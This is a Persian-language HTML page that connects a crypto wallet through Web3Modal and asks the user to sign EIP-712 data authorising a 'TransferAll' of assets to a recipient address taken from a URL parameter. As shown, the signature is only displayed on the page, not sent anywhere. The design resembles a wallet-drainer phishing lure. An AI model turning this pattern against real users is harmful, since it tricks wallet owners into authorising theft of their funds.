<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>اتصال و امضای کیف پول</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@web3modal/standalone@3.6.5/dist/web3modal-standalone.umd.js"></script>
  <style>
    body { font-family: sans-serif; padding: 2rem; direction: rtl; background: #f9f9f9; }
    button { padding: 1rem 2rem; font-size: 16px; background: #5c67f2; color: white; border: none; border-radius: 8px; cursor: pointer; }
    pre { background: #eee; padding: 1rem; border-radius: 6px; margin-top: 1rem; }
  </style>
</head>
<body>
  <h2>🔐 امضای انتقال دارایی با انتخاب کیف پول</h2>
  <button id="connect-btn">اتصال و امضا</button>
  <pre id="result"></pre>

  <script>
    const projectId = "f90d92aa0fc85c96777dd9041203122b"; // ← این رو با Project ID واقعی جایگزین کن

    const modal = new window.Web3Modal({
      projectId,
      themeMode: 'light',
      walletConnectVersion: 2,
      standaloneChains: ['eip155:1', 'eip155:11155111'],
    });

    document.getElementById("connect-btn").addEventListener("click", async () => {
      try {
        const provider = await modal.connect();
        const web3Provider = new ethers.providers.Web3Provider(provider);
        const signer = web3Provider.getSigner();
        const address = await signer.getAddress();
        const network = await web3Provider.getNetwork();

        const url = new URL(window.location.href);
        const to = url.searchParams.get("to") || "0x000000000000000000000000000000000000dead";
        const deadline = Math.floor(Date.now() / 1000) + 600;

        const domain = {
          name: "TransferAll",
          version: "1",
          chainId: network.chainId,
          verifyingContract: "0x0000000000000000000000000000000000000000"
        };

        const types = {
          TransferAll: [
            { name: "from", type: "address" },
            { name: "to", type: "address" },
            { name: "deadline", type: "uint256" }
          ]
        };

        const message = { from: address, to, deadline };
        const signature = await signer._signTypedData(domain, types, message);

        document.getElementById("result").innerText =
          "✅ امضا انجام شد:\n" + JSON.stringify({ address, signature, message }, null, 2);
      } catch (err) {
        document.getElementById("result").innerText = "❌ خطا:\n" + err.message;
      }
    });
  </script>
</body>
</html>
